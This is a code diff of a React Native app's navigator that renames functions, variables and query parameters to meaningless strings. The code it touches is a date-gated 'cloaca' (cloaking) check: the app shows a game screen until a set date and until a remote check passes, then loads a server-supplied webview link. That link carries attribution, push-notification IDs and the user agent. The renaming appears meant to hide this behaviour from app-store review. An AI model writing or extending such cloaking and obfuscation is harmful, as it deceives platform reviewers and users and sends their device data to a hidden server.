@@ -38,9 +38,9 @@ function sameItem(left, right) {
 }
 // LoaderScreen
 export function AppNavigator({
-  initialUrl,
-  initialId,
-  oneSignKkkk,
+  initialQklsdvjlmsdvkns,
+  ivnskdjhfcnsdjfsnID,
+  ovwknvskvSdvdsvdsiv,
 }) {
   const [route, setRoute] = useState(false);
   console.log('route===>', route);
@@ -81,13 +81,13 @@ export function AppNavigator({
 
   const pushOpenWebviewRef = useRef(false);
 
-  const INITIAL_URL = initialUrl;
-  const URL_IDENTIFAIRE = initialId;
+  const HBJYBJBJB_BJL = initialQklsdvjlmsdvkns;
+  const YHBKJNBUKN_ID = ivnskdjhfcnsdjfsnID;
 
-  const TARGET_DATA = new Date(2026, 5, 5, 8, 8, 0);
+  const GHJJFMGYHJH_ATAD = new Date(2026, 5, 5, 8, 8, 0);
 
   useEffect(() => {
-    //const targetData = TARGET_DATA; //дата з якої поч працювати webView
+    //const targetData = GHJJFMGYHJH_ATAD; //дата з якої поч працювати webView
     //const currentData = new Date(); //текущая дата
     //
     //if (currentData <= targetData) {
@@ -111,7 +111,7 @@ export function AppNavigator({
   useEffect(() => {
     const finalizeProcess = async () => {
       if (isDataReady) {
-        await generateLink(); // Викликати generateLink, коли всі дані готові
+        await fdjkvndfjvbfkdLIN(); // Викликати fdjkvndfjvbfkdLIN, коли всі дані готові
         console.log('Фінальна лінка сформована!');
       }
     };
@@ -139,7 +139,7 @@ export function AppNavigator({
       await AsyncStorage.setItem('timeStampUserId', timestamp_user_id);
 
       await fetch(
-        `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=uniq_visit&jthrhg=${timestamp_user_id}`,
+        `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?utretg=uniq_visit&jthrhg=${timestamp_user_id}`,
       );
       OneSignal.User.addTag('timestamp_user_id', timestamp_user_id);
       console.log('унікальний візит!!!');
@@ -189,8 +189,8 @@ export function AppNavigator({
 
         // Якщо дані не знайдені в AsyncStorage
         const results = await Promise.all([
-          fetchAdServicesAttributionData(),
-          requestOneSignallFoo(),
+          fdjdvhksfhvfkvvkdslnsJHJKHKnjnvdskvjns(),
+          fkdlvndfknvfdknvdfkvn(),
         ]);
 
         // Результати виконаних функцій
@@ -271,7 +271,7 @@ export function AppNavigator({
     timeStampUserId,
   ]);
 
-  const fetchAdServicesAttributionData = async () => {
+  const fdjdvhksfhvfkvvkdslnsJHJKHKnjnvdskvjns = async () => {
     try {
       const adServicesAttributionData =
         await AppleAdsAttribution.getAdServicesAttributionData();
@@ -296,7 +296,7 @@ export function AppNavigator({
   };
 
   ///////// OneSignall
-  const requestPermission = () => {
+  const jkdsvbdsjkvndskvndskj = () => {
     return new Promise((resolve, reject) => {
       try {
         OneSignal.Notifications.requestPermission(true).then(res => {
@@ -337,13 +337,13 @@ export function AppNavigator({
     });
   };
 
-  // Виклик асинхронної функції requestPermission() з використанням async/await
-  const requestOneSignallFoo = async () => {
+  // Виклик асинхронної функції jkdsvbdsjkvndskvndskj() з використанням async/await
+  const fkdlvndfknvfdknvdfkvn = async () => {
     try {
-      await requestPermission();
+      await jkdsvbdsjkvndskvndskj();
       // Якщо все Ok
     } catch (error) {
-      console.log('err в requestOneSignallFoo==> ', error);
+      console.log('err в fkdlvndfknvfdknvdfkvn==> ', error);
     }
   };
 
@@ -360,16 +360,16 @@ export function AppNavigator({
   }, [timeStampUserId]);
 
   // event push_open_browser & push_open_webview
-  const pushOpenWebViewOnce = useRef(false); // Стан, щоб уникнути дублювання
+  const dvnksjvndsjvdskvnksvndsknv = useRef(false); // Стан, щоб уникнути дублювання
 
   useEffect(() => {
     // Додаємо слухач подій
     const handleNotificationClick = async event => {
-      if (pushOpenWebViewOnce.current) {
+      if (dvnksjvndsjvdskvnksvndsknv.current) {
         return;
       }
 
-      pushOpenWebViewOnce.current = true;
+      dvnksjvndsjvdskvnksvndsknv.current = true;
 
       try {
         const storedTimeStampUserId = await AsyncStorage.getItem(
@@ -387,7 +387,7 @@ export function AppNavigator({
           ? 'push_open_browser'
           : 'push_open_webview';
 
-        const pushEventUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=${eventName}&jthrhg=${
+        const pushEventUrl = `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?utretg=${eventName}&jthrhg=${
           storedTimeStampUserId || ''
         }`;
 
@@ -399,13 +399,13 @@ export function AppNavigator({
 
         // Якщо всі дані вже готові — одразу перегенеруємо лінку
         if (isDataReady && uid) {
-          await generateLink(true);
+          await fdjkvndfjvbfkdLIN(true);
         }
       } catch (error) {
         console.log('handleNotificationClick error =>', error);
       } finally {
         setTimeout(() => {
-          pushOpenWebViewOnce.current = false;
+          dvnksjvndsjvdskvnksvndsknv.current = false;
         }, 2500);
       }
     };
@@ -431,10 +431,10 @@ export function AppNavigator({
     // якщо вже є route або клоака вже проходила успішно – нічого не робимо
     if (route || cloacaPass) return;
 
-    const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
+    const checkUrl = `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}`;
     //console.log('checkUrl==========+>', checkUrl);
 
-    const targetData = TARGET_DATA; //дата з якої поч працювати webView
+    const targetData = GHJJFMGYHJH_ATAD; //дата з якої поч працювати webView
     const currentData = new Date(); //текущая дата
 
     if (currentData <= targetData) {
@@ -444,7 +444,7 @@ export function AppNavigator({
       return;
     }
 
-    const fetchCloaca = async () => {
+    const dsjcbsdjhbcvhjsdbCLO = async () => {
       try {
         const userAgent = await DeviceInfo.getUserAgent();
         const systemVersion = DeviceInfo.getSystemVersion();
@@ -475,30 +475,30 @@ export function AppNavigator({
       }
     };
 
-    fetchCloaca();
+    dsjcbsdjhbcvhjsdbCLO();
   }, [isDataReady, route, cloacaPass]);
 
   ///////// Generate link
-  const generateLink = async (openedFromPush = false) => {
+  const fdjkvndfjvbfkdLIN = async (openedFromPush = false) => {
     try {
       //if (!uid) {
-      //  console.log('generateLink: uid ще немає, лінку не формуємо');
+      //  console.log('fdjkvndfjvbfkdLIN: uid ще немає, лінку не формуємо');
       //  return;
       //}
 
       console.log('Створення базової частини лінки');
 
       const baseUrl = [
-        `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`,
+        `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?${YHBKJNBUKN_ID}=1`,
         //idfa ? `idfa=${idfa}` : 'idfa=00000000-0000-0000-0000-000000000000',
         //`uid=${uid}`,
-        oneSignalId ? `oneSignalId=${oneSignalId}` : '',
+        oneSignalId ? `jskdcbasjcjksac=${oneSignalId}` : '',
         `jthrhg=${timeStampUserId || ''}`,
       ]
         .filter(Boolean)
         .join('&');
 
-      const additionalParams = atribParam ? `subId1=${atribParam}` : '';
+      const additionalParams = atribParam ? `dvsvsvsv1=${atribParam}` : '';
 
       const shouldAddPushParam = openedFromPush || pushOpenWebviewRef.current;
 
@@ -531,7 +531,7 @@ export function AppNavigator({
         //}
 
         setFinalLink(
-          `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1&jthrhg=${timeStampUserId || ''}&oneSignalId=${
+          `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?${YHBKJNBUKN_ID}=1&jthrhg=${timeStampUserId || ''}&jskdcbasjcjksac=${
             oneSignalId || ''
           }`,
         );
@@ -556,16 +556,22 @@ export function AppNavigator({
         <Stack.Navigator>
           <Stack.Screen
             initialParams={{
-              responseToPushPermition,
               product: finalLink,
-              timeStampUserId: timeStampUserId,
               customUserAgent: customUserAgent,
-              initialUrl: INITIAL_URL,
-              initialId: URL_IDENTIFAIRE,
             }}
             name="ProdView"
             component={ProdView}
             options={{headerShown: false}}
+          />
+          <Stack.Screen
+            name="GameView"
+            component={GameView}
+            options={{
+              headerShown: false,
+              animation: 'slide_from_right',
+              presentation: 'card',
+              gestureEnabled: true,
+            }}
           />
         </Stack.Navigator>
       );
